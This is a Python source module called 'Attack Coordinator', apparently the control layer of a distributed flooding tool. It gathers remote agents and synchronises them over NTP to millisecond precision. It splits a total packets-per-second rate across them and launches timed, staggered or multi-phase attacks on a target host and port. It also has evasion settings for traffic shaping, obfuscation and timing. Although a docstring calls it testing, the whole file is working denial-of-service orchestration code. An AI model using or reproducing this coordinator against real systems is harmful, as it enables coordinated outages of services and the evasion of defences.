"""
Attack Coordinator

High-level coordination for distributed attacks.
Provides easy-to-use interface for multi-machine testing.

Enhanced with:
- Real-time statistics streaming (Requirement 7.3)
- Load redistribution support (Requirement 7.4)
- NTP-synchronized distributed coordination (Requirements 7.1, 7.2, 7.3, 7.4, 7.5)
"""

import asyncio
import time
from dataclasses import dataclass, field
from typing import List, Dict, Any, Optional, AsyncIterator
import logging

from .controller import DistributedController, ControllerConfig
from .protocol import AttackConfig, AgentStatus
from .stats_aggregator import StatsAggregator, AggregatedStats
from .time_sync import NTPClient, TimeSyncResult, ControllerTimeSync

logger = logging.getLogger(__name__)


@dataclass
class NTPCoordinatorConfig:
    """Configuration for NTP-based coordination"""
    ntp_servers: List[str] = field(default_factory=lambda: [
        'pool.ntp.org',
        'time.google.com', 
        'time.cloudflare.com',
        'time.windows.com'
    ])
    sync_interval: float = 300.0  # Re-sync every 5 minutes
    max_drift_threshold: float = 0.1  # Alert if drift exceeds 100ms
    sync_timeout: float = 5.0  # Timeout for NTP queries
    min_sync_accuracy: float = 0.01  # Minimum required sync accuracy (10ms)


class NTPCoordinator:
    """
    NTP-synchronized distributed attack coordinator.
    
    Provides millisecond-precision synchronization across distributed nodes
    using NTP time references and compensates for network latency.
    
    Requirements addressed:
    - 7.1: Query multiple NTP servers and calculate average offset
    - 7.4: Compensate for network latency in time calculations
    """
    
    def __init__(self, config: Optional[NTPCoordinatorConfig] = None):
        self.config = config or NTPCoordinatorConfig()
        self.ntp_client = NTPClient(
            servers=self.config.ntp_servers,
            timeout=self.config.sync_timeout
        )
        
        # Time synchronization state
        self._current_offset: float = 0.0
        self._last_sync_time: float = 0.0
        self._sync_accuracy: float = float('inf')
        self._drift_rate: float = 0.0  # Seconds per second
        self._sync_history: List[TimeSyncResult] = []
        
        # Monitoring
        self._running = False
        self._sync_task: Optional[asyncio.Task] = None
        self._drift_alerts: List[Dict[str, Any]] = []
        
    async def start(self) -> bool:
        """
        Start the NTP coordinator and perform initial synchronization.
        
        Returns:
            True if initial sync was successful
        """
        logger.info("Starting NTP coordinator...")
        
        # Perform initial synchronization
        success = await self.sync_time()
        if not success:
            logger.error("Failed to perform initial NTP synchronization")
            return False
            
        self._running = True
        
        # Start periodic sync task
        self._sync_task = asyncio.create_task(self._periodic_sync())
        
        logger.info(f"NTP coordinator started with {len(self.config.ntp_servers)} servers")
        logger.info(f"Initial offset: {self._current_offset:.6f}s, accuracy: {self._sync_accuracy:.6f}s")
        
        return True
        
    async def stop(self):
        """Stop the NTP coordinator"""
        self._running = False
        
        if self._sync_task:
            self._sync_task.cancel()
            try:
                await self._sync_task
            except asyncio.CancelledError:
                pass
                
        logger.info("NTP coordinator stopped")
        
    async def sync_time(self) -> bool:
        """
        Synchronize time with NTP servers and calculate average offset.
        
        Queries multiple NTP servers and uses median offset for robustness.
        Compensates for network latency using round-trip measurements.
        
        Returns:
            True if synchronization was successful
        """
        logger.debug("Performing NTP synchronization...")
        
        # Query all configured servers
        results = []
        for server in self.config.ntp_servers:
            try:
                result = await self.ntp_client._query_server(server)
                if result.synced and result.delay < 1.0:  # Reject high-latency results
                    results.append(result)
                    logger.debug(f"NTP sync with {server}: offset={result.offset:.6f}s, delay={result.delay:.6f}s")
            except Exception as e:
                logger.debug(f"NTP query to {server} failed: {e}")
                
        if not results:
            logger.warning("Failed to sync with any NTP server")
            return False
            
        # Use median offset for robustness against outliers
        results.sort(key=lambda r: r.offset)
        median_result = results[len(results) // 2]
        
        # Calculate average offset from all successful results
        avg_offset = sum(r.offset for r in results) / len(results)
        
        # Calculate sync accuracy as standard deviation
        if len(results) > 1:
            variance = sum((r.offset - avg_offset) ** 2 for r in results) / len(results)
            accuracy = variance ** 0.5
        else:
            accuracy = median_result.delay / 2  # Use half of round-trip as accuracy estimate
            
        # Update state
        old_offset = self._current_offset
        self._current_offset = avg_offset
        self._sync_accuracy = accuracy
        self._last_sync_time = time.time()
        
        # Calculate drift rate if we have previous sync
        if self._sync_history:
            time_diff = self._last_sync_time - self._sync_history[-1].sync_time
            offset_diff = self._current_offset - self._sync_history[-1].offset
            if time_diff > 0:
                self._drift_rate = offset_diff / time_diff
                
        # Store result in history
        sync_result = TimeSyncResult(
            offset=avg_offset,
            delay=median_result.delay,
            stratum=median_result.stratum,
            precision=accuracy,
            synced=True,
            sync_time=self._last_sync_time
        )
        self._sync_history.append(sync_result)
        
        # Keep only last 100 results
        if len(self._sync_history) > 100:
            self._sync_history.pop(0)
            
        logger.info(f"NTP sync complete: offset={avg_offset:.6f}s, accuracy={accuracy:.6f}s, "
                   f"servers={len(results)}/{len(self.config.ntp_servers)}")
                   
        # Check if accuracy meets requirements
        if accuracy > self.config.min_sync_accuracy:
            logger.warning(f"Sync accuracy {accuracy:.6f}s exceeds threshold {self.config.min_sync_accuracy:.6f}s")
            
        return True
        
    async def _periodic_sync(self):
        """Periodically synchronize with NTP servers"""
        while self._running:
            await asyncio.sleep(self.config.sync_interval)
            
            if not self._running:
                break
                
            try:
                await self.sync_time()
                await self._check_drift()
            except Exception as e:
                logger.error(f"Periodic NTP sync failed: {e}")
                
    async def _check_drift(self):
        """Check for excessive clock drift and alert if necessary"""
        if len(self._sync_history) < 2:
            return
            
        # Calculate current drift
        current_time = time.time()
        time_since_sync = current_time - self._last_sync_time
        estimated_drift = abs(self._drift_rate * time_since_sync)
        
        if estimated_drift > self.config.max_drift_threshold:
            alert = {
                'timestamp': current_time,
                'drift': estimated_drift,
                'drift_rate': self._drift_rate,
                'threshold': self.config.max_drift_threshold
            }
            self._drift_alerts.append(alert)
            
            logger.warning(f"Excessive clock drift detected: {estimated_drift:.6f}s "
                          f"(rate: {self._drift_rate:.9f}s/s)")
                          
            # Keep only last 10 alerts
            if len(self._drift_alerts) > 10:
                self._drift_alerts.pop(0)
                
    def get_synchronized_time(self) -> float:
        """
        Get current time synchronized with NTP servers.
        
        Compensates for measured offset and estimated drift.
        
        Returns:
            Current time in NTP-synchronized reference
        """
        current_time = time.time()
        
        # Apply measured offset
        sync_time = current_time - self._current_offset
        
        # Apply drift correction if we have drift data
        if self._last_sync_time > 0:
            time_since_sync = current_time - self._last_sync_time
            drift_correction = self._drift_rate * time_since_sync
            sync_time -= drift_correction
            
        return sync_time
        
    def compensate_network_latency(self, target_time: float, 
                                   network_latency: float) -> float:
        """
        Compensate target time for network latency.
        
        Args:
            target_time: Desired execution time
            network_latency: Estimated one-way network latency in seconds
            
        Returns:
            Adjusted time accounting for network delay
        """
        return target_time - network_latency
        
    def get_sync_status(self) -> Dict[str, Any]:
        """Get current synchronization status"""
        current_time = time.time()
        
        return {
            'synchronized': len(self._sync_history) > 0,
            'current_offset': self._current_offset,
            'sync_accuracy': self._sync_accuracy,
            'last_sync_age': current_time - self._last_sync_time if self._last_sync_time > 0 else float('inf'),
            'drift_rate': self._drift_rate,
            'drift_alerts': len(self._drift_alerts),
            'servers_configured': len(self.config.ntp_servers),
            'sync_history_count': len(self._sync_history)
        }
        
    def get_drift_alerts(self) -> List[Dict[str, Any]]:
        """Get list of recent drift alerts"""
        return self._drift_alerts.copy()


@dataclass
class CoordinatedAttack:
    """Configuration for a coordinated attack"""
    name: str
    target: str
    port: int
    protocol: str
    duration: int = 60
    
    # Distribution settings
    agents_required: int = 1          # Minimum agents needed
    distribute_rate: bool = True      # Distribute rate across agents
    total_rate: int = 100000          # Total PPS across all agents
    
    # Evasion settings
    use_evasion: bool = False
    shaping_profile: str = "aggressive"
    obfuscation_method: str = "none"
    timing_pattern: str = "constant"
    
    # Coordination
    sync_start: bool = True
    stagger_start: float = 0.0        # Seconds between agent starts
    
    # Phases (for multi-phase attacks)
    phases: List[Dict[str, Any]] = field(default_factory=list)


class AttackCoordinator:
    """
    High-level coordinator for distributed attacks.
    
    Features:
    - Easy attack configuration
    - Automatic agent management
    - Multi-phase attack support
    - Real-time monitoring with streaming stats (Requirement 7.3)
    - NTP-synchronized timestamp-based scheduling (Requirements 7.2, 7.3)
    """
    
    def __init__(self, controller: Optional[DistributedController] = None,
                 ntp_coordinator: Optional[NTPCoordinator] = None):
        self.controller = controller
        self._owns_controller = False
        
        # NTP coordination (Requirements 7.1, 7.2, 7.3)
        self.ntp_coordinator = ntp_coordinator
        self._owns_ntp_coordinator = False
        
        # Attack state
        self.current_attack: Optional[CoordinatedAttack] = None
        self.attack_active = False
        self.attack_start_time = 0.0
        self._scheduled_start_timestamp: Optional[float] = None
        
        # Statistics
        self.total_stats: Dict[str, Any] = {}
        self._phase_stats: List[Dict[str, Any]] = []
        
        # Real-time stats aggregator (Requirement 7.3)
        self._stats_aggregator: Optional[StatsAggregator] = None
        
    async def start_controller(self, config: Optional[ControllerConfig] = None,
                               ntp_config: Optional[NTPCoordinatorConfig] = None):
        """Start a new controller if not provided"""
        if self.controller is None:
            self.controller = DistributedController(config)
            self._owns_controller = True
            await self.controller.start()
        
        # Start NTP coordinator if not provided (Requirements 7.1, 7.2)
        if self.ntp_coordinator is None:
            self.ntp_coordinator = NTPCoordinator(ntp_config)
            self._owns_ntp_coordinator = True
            success = await self.ntp_coordinator.start()
            if not success:
                logger.warning("NTP synchronization failed - timestamps may be inaccurate")
        
        # Start stats aggregator (Requirement 7.3)
        self._stats_aggregator = StatsAggregator(
            update_interval=config.stats_update_interval if config else 0.1,
            history_size=config.stats_history_size if config else 1000,
        )
        await self._stats_aggregator.start()
        
        # Register stats callback with controller
        if self.controller:
            self.controller.on_stats_update(self._on_controller_stats)
            
    async def stop_controller(self):
        """Stop the controller if we own it"""
        # Stop stats aggregator
        if self._stats_aggregator:
            await self._stats_aggregator.stop()
            self._stats_aggregator = None
        
        # Stop NTP coordinator if we own it
        if self._owns_ntp_coordinator and self.ntp_coordinator:
            await self.ntp_coordinator.stop()
            self.ntp_coordinator = None
        
        if self._owns_controller and self.controller:
            await self.controller.stop()
            self.controller = None
    
    def _on_controller_stats(self, stats: Dict[str, Any]):
        """Callback for controller stats updates"""
        # This is called synchronously, so we need to schedule the async update
        if self._stats_aggregator and self.controller:
            for agent in self.controller.get_agents():
                asyncio.create_task(
                    self._stats_aggregator.update_agent_stats(
                        agent.agent_id,
                        agent.current_stats,
                        active=agent.status == AgentStatus.ATTACKING
                    )
                )
            
    async def wait_for_agents(self, count: int, timeout: float = 60.0) -> bool:
        """
        Wait for specified number of agents to connect.
        
        Args:
            count: Number of agents to wait for
            timeout: Maximum wait time in seconds
            
        Returns:
            True if enough agents connected
        """
        if not self.controller:
            return False
            
        start = time.time()
        while time.time() - start < timeout:
            active = self.controller.get_active_agents()
            if len(active) >= count:
                logger.info(f"{len(active)} agents connected")
                return True
            await asyncio.sleep(1.0)
            
        logger.warning(f"Timeout waiting for agents. Have {len(self.controller.get_active_agents())}, need {count}")
        return False
        
    def schedule_attack_at_timestamp(self, attack: CoordinatedAttack, 
                                     unix_timestamp: float) -> None:
        """
        Schedule an attack to start at an exact Unix timestamp.
        
        Replaces asyncio.sleep() with precise timestamp-based scheduling
        for millisecond-precision synchronization across distributed nodes.
        
        Args:
            attack: Attack configuration
            unix_timestamp: Exact Unix timestamp when attack should start
            
        Requirements: 7.2, 7.3
        """
        self._scheduled_start_timestamp = unix_timestamp
        logger.info(f"Attack '{attack.name}' scheduled for timestamp {unix_timestamp} "
                   f"({time.ctime(unix_timestamp)})")
                   
    def get_synchronized_start_timestamp(self, delay_seconds: float = 5.0) -> float:
        """
        Calculate a synchronized start timestamp for distributed attack.
        
        Uses NTP-synchronized time to ensure all nodes start at the same moment
        with millisecond precision.
        
        Args:
            delay_seconds: Seconds from now to schedule the attack
            
        Returns:
            Unix timestamp for synchronized start
            
        Requirements: 7.2, 7.3
        """
        if self.ntp_coordinator:
            sync_time = self.ntp_coordinator.get_synchronized_time()
            return sync_time + delay_seconds
        else:
            logger.warning("No NTP coordinator - using local time (less accurate)")
            return time.time() + delay_seconds
            
    async def wait_for_timestamp(self, target_timestamp: float, 
                                 precision_ms: float = 1.0) -> None:
        """
        Wait until a specific timestamp with millisecond precision.
        
        Replaces asyncio.sleep() with timestamp-based waiting for precise
        synchronization across distributed nodes.
        
        Args:
            target_timestamp: Unix timestamp to wait for
            precision_ms: Precision in milliseconds (default 1ms)
            
        Requirements: 7.2, 7.3
        """
        precision_seconds = precision_ms / 1000.0
        
        while True:
            current_time = (self.ntp_coordinator.get_synchronized_time() 
                           if self.ntp_coordinator else time.time())
            
            time_remaining = target_timestamp - current_time
            
            if time_remaining <= 0:
                break
                
            if time_remaining > 1.0:
                # Sleep for most of the time, but wake up 1 second before
                await asyncio.sleep(time_remaining - 1.0)
            elif time_remaining > precision_seconds:
                # Use shorter sleeps as we get closer
                await asyncio.sleep(min(0.1, time_remaining / 2))
            else:
                # Busy wait for final precision
                while True:
                    current_time = (self.ntp_coordinator.get_synchronized_time() 
                                   if self.ntp_coordinator else time.time())
                    if current_time >= target_timestamp:
                        break
                    # Very short sleep to avoid busy loop
                    await asyncio.sleep(0.001)
                break
        
    async def execute_attack(self, attack: CoordinatedAttack) -> Dict[str, Any]:
        """
        Execute a coordinated attack.
        
        Args:
            attack: Attack configuration
            
        Returns:
            Attack results and statistics
        """
        if not self.controller:
            raise RuntimeError("Controller not started")
            
        # Check agent count
        agents = self.controller.get_active_agents()
        if len(agents) < attack.agents_required:
            raise RuntimeError(
                f"Not enough agents. Have {len(agents)}, need {attack.agents_required}"
            )
            
        logger.info(f"Starting coordinated attack: {attack.name}")
        logger.info(f"Target: {attack.target}:{attack.port} ({attack.protocol})")
        logger.info(f"Agents: {len(agents)}")
        
        self.current_attack = attack
        self.attack_active = True
        self.attack_start_time = time.time()
        
        # Calculate per-agent rate
        if attack.distribute_rate:
            per_agent_rate = attack.total_rate // len(agents)
        else:
            per_agent_rate = attack.total_rate
            
        # Build attack config
        config = AttackConfig(
            target=attack.target,
            port=attack.port,
            protocol=attack.protocol,
            duration=attack.duration,
            rate_limit=per_agent_rate,
            use_evasion=attack.use_evasion,
            shaping_profile=attack.shaping_profile,
            obfuscation_method=attack.obfuscation_method,
            timing_pattern=attack.timing_pattern,
            sync_start=attack.sync_start,
        )
        
        # Handle timestamp-based or staggered start
        if self._scheduled_start_timestamp:
            # Use precise timestamp-based scheduling (Requirements 7.2, 7.3)
            logger.info(f"Waiting for scheduled start time: {self._scheduled_start_timestamp}")
            await self.wait_for_timestamp(self._scheduled_start_timestamp)
            await self.controller.start_attack(config, sync=False)  # Already synchronized
            self._scheduled_start_timestamp = None  # Clear after use
        elif attack.stagger_start > 0:
            await self._staggered_start(config, agents, attack.stagger_start)
        else:
            await self.controller.start_attack(config, sync=attack.sync_start)
            
        # Wait for attack to complete
        try:
            await asyncio.sleep(attack.duration)
        except asyncio.CancelledError:
            logger.info("Attack cancelled")
            
        # Stop attack
        await self.controller.stop_attack()
        
        self.attack_active = False
        
        # Collect final stats
        self.total_stats = self.controller.get_stats()
        self.total_stats['duration'] = time.time() - self.attack_start_time
        self.total_stats['attack_name'] = attack.name
        
        logger.info(f"Attack completed: {attack.name}")
        logger.info(f"Total packets: {self.total_stats.get('packets_sent', 0)}")
        logger.info(f"Total PPS: {self.total_stats.get('pps', 0)}")
        
        return self.total_stats
        
    async def _staggered_start(self, config: AttackConfig, 
                               agents: List, stagger: float):
        """Start agents with staggered timing using precise timestamps"""
        base_timestamp = (self.ntp_coordinator.get_synchronized_time() 
                         if self.ntp_coordinator else time.time())
        
        for i, agent in enumerate(agents):
            # Calculate precise start timestamp for this agent
            agent_start_timestamp = base_timestamp + (i * stagger)
            
            # Adjust start time for this agent
            agent_config = AttackConfig(
                target=config.target,
                port=config.port,
                protocol=config.protocol,
                duration=config.duration,
                rate_limit=config.rate_limit,
                use_evasion=config.use_evasion,
                shaping_profile=config.shaping_profile,
                obfuscation_method=config.obfuscation_method,
                timing_pattern=config.timing_pattern,
                sync_start=False,
                start_time=agent_start_timestamp,  # Use precise timestamp
            )
            
            msg = self.controller.msg_builder.start_attack(agent_config)
            await self.controller.send_to_agent(agent.agent_id, msg)
            
    async def execute_multi_phase(self, attack: CoordinatedAttack) -> List[Dict[str, Any]]:
        """
        Execute a multi-phase attack.
        
        Each phase can have different settings (rate, protocol, etc.)
        
        Args:
            attack: Attack with phases defined
            
        Returns:
            List of statistics for each phase
        """
        if not attack.phases:
            # Single phase
            result = await self.execute_attack(attack)
            return [result]
            
        results = []
        
        for i, phase in enumerate(attack.phases):
            logger.info(f"Starting phase {i+1}/{len(attack.phases)}")
            
            # Create phase attack config
            phase_attack = CoordinatedAttack(
                name=f"{attack.name}_phase{i+1}",
                target=attack.target,
                port=attack.port,
                protocol=phase.get('protocol', attack.protocol),
                duration=phase.get('duration', attack.duration // len(attack.phases)),
                agents_required=attack.agents_required,
                distribute_rate=attack.distribute_rate,
                total_rate=phase.get('rate', attack.total_rate),
                use_evasion=phase.get('use_evasion', attack.use_evasion),
                shaping_profile=phase.get('shaping_profile', attack.shaping_profile),
                obfuscation_method=phase.get('obfuscation_method', attack.obfuscation_method),
                timing_pattern=phase.get('timing_pattern', attack.timing_pattern),
                sync_start=attack.sync_start,
            )
            
            result = await self.execute_attack(phase_attack)
            results.append(result)
            
            # Delay between phases
            phase_delay = phase.get('delay_after', 1.0)
            if phase_delay > 0 and i < len(attack.phases) - 1:
                logger.info(f"Waiting {phase_delay}s before next phase")
                await asyncio.sleep(phase_delay)
                
        return results
        
    async def stop_attack(self):
        """Stop the current attack"""
        if self.controller and self.attack_active:
            await self.controller.stop_attack()
            self.attack_active = False
            
    def get_live_stats(self) -> Dict[str, Any]:
        """Get live statistics during attack"""
        if not self.controller:
            return {}
            
        stats = self.controller.get_stats()
        
        if self.attack_active:
            stats['elapsed'] = time.time() - self.attack_start_time
            if self.current_attack:
                stats['remaining'] = max(0, self.current_attack.duration - stats['elapsed'])
                stats['progress'] = min(100, (stats['elapsed'] / self.current_attack.duration) * 100)
                
        return stats
    
    # Real-time stats streaming (Requirement 7.3)
    
    async def stream_stats(self) -> AsyncIterator[AggregatedStats]:
        """
        Stream real-time aggregated statistics.
        
        Usage:
            async for stats in coordinator.stream_stats():
                print(f"PPS: {stats.total_pps}, Agents: {stats.active_agents}")
        """
        if not self._stats_aggregator:
            return
        
        async for stats in self._stats_aggregator.stream():
            # Add attack progress info
            if self.attack_active and self.current_attack:
                elapsed = time.time() - self.attack_start_time
                # Note: AggregatedStats doesn't have these fields, 
                # but we yield the stats object as-is
            yield stats
    
    async def get_stats_history(self, count: int = 100) -> List[AggregatedStats]:
        """Get historical aggregated statistics"""
        if not self._stats_aggregator:
            return []
        return await self._stats_aggregator.get_history(count)
    
    def get_prometheus_metrics(self) -> str:
        """Get current stats in Prometheus format"""
        if self._stats_aggregator:
            return self._stats_aggregator.get_prometheus_metrics()
        return ""
    
    def get_json_metrics(self) -> str:
        """Get current stats in JSON format"""
        if self._stats_aggregator:
            return self._stats_aggregator.get_json_metrics()
        return "{}"
    
    def get_aggregated_stats(self) -> Optional[AggregatedStats]:
        """Get current aggregated stats object"""
        if self._stats_aggregator:
            return self._stats_aggregator.get_current()
        return None
        
    # Clock drift detection and correction (Requirement 7.5)
    
    def get_clock_drift_status(self) -> Dict[str, Any]:
        """
        Get current clock drift status and alerts.
        
        Returns:
            Dictionary containing drift information and alerts
            
        Requirement: 7.5
        """
        if not self.ntp_coordinator:
            return {'error': 'NTP coordinator not available'}
            
        status = self.ntp_coordinator.get_sync_status()
        alerts = self.ntp_coordinator.get_drift_alerts()
        
        return {
            'synchronized': status['synchronized'],
            'current_offset': status['current_offset'],
            'sync_accuracy': status['sync_accuracy'],
            'last_sync_age': status['last_sync_age'],
            'drift_rate': status['drift_rate'],
            'drift_alerts_count': len(alerts),
            'recent_alerts': alerts[-5:] if alerts else [],  # Last 5 alerts
            'excessive_drift': len(alerts) > 0,
            'sync_health': self._assess_sync_health(status, alerts)
        }
        
    def _assess_sync_health(self, status: Dict[str, Any], 
                           alerts: List[Dict[str, Any]]) -> str:
        """Assess overall synchronization health"""
        if not status['synchronized']:
            return 'CRITICAL'
        
        if status['last_sync_age'] > 600:  # 10 minutes
            return 'WARNING'
            
        if len(alerts) > 0:
            recent_alerts = [a for a in alerts if time.time() - a['timestamp'] < 300]  # 5 minutes
            if len(recent_alerts) > 0:
                return 'WARNING'
                
        if status['sync_accuracy'] > 0.01:  # 10ms
            return 'DEGRADED'
            
        return 'HEALTHY'
        
    async def force_resync(self) -> bool:
        """
        Force immediate re-synchronization with NTP servers.
        
        Useful when excessive drift is detected or sync health is poor.
        
        Returns:
            True if re-sync was successful
            
        Requirement: 7.5
        """
        if not self.ntp_coordinator:
            logger.error("Cannot force resync - NTP coordinator not available")
            return False
            
        logger.info("Forcing NTP re-synchronization...")
        success = await self.ntp_coordinator.sync_time()
        
        if success:
            logger.info("Forced NTP re-sync completed successfully")
        else:
            logger.error("Forced NTP re-sync failed")
            
        return success
        
    def monitor_drift_continuously(self) -> bool:
        """
        Check if continuous drift monitoring is active.
        
        Returns:
            True if drift monitoring is running
        """
        return (self.ntp_coordinator is not None and 
                self.ntp_coordinator._running)
                
    def get_drift_correction_estimate(self, future_timestamp: float) -> float:
        """
        Estimate drift correction for a future timestamp.
        
        Args:
            future_timestamp: Future timestamp to estimate drift for
            
        Returns:
            Estimated drift correction in seconds
        """
        if not self.ntp_coordinator:
            return 0.0
            
        current_time = time.time()
        time_diff = future_timestamp - current_time
        
        if time_diff <= 0:
            return 0.0
            
        # Use measured drift rate to estimate future drift
        drift_rate = self.ntp_coordinator._drift_rate
        estimated_drift = drift_rate * time_diff
        
        return estimated_drift


# Convenience functions for quick setup

async def quick_distributed_attack(
    target: str,
    port: int,
    protocol: str = "UDP",
    duration: int = 60,
    controller_port: int = 9999,
    wait_for_agents: int = 1,
    agent_timeout: float = 60.0,
) -> Dict[str, Any]:
    """
    Quick setup for a distributed attack.
    
    Usage:
        # On controller machine:
        result = await quick_distributed_attack("192.168.1.100", 80, "HTTP", 60)
        
        # On agent machines (run separately):
        # python -m core.distributed.agent --controller <controller_ip>
    """
    coordinator = AttackCoordinator()
    
    try:
        # Start controller
        await coordinator.start_controller(ControllerConfig(bind_port=controller_port))
        
        # Wait for agents
        print(f"Waiting for {wait_for_agents} agent(s) to connect...")
        print(f"Agents should connect to port {controller_port}")
        
        if not await coordinator.wait_for_agents(wait_for_agents, agent_timeout):
            raise RuntimeError("Not enough agents connected")
            
        # Execute attack
        attack = CoordinatedAttack(
            name="quick_attack",
            target=target,
            port=port,
            protocol=protocol,
            duration=duration,
            agents_required=wait_for_agents,
        )
        
        return await coordinator.execute_attack(attack)
        
    finally:
        await coordinator.stop_controller()
